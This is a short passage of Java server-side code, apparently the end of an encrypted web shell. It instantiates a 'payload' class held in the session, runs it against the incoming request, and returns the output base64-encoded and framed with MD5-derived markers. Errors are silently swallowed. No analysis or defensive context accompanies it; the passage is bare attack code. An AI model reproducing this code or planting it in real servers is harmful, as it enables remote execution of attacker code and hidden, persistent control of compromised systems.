                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
            }
        } catch (Exception e) {
        }
    }
}
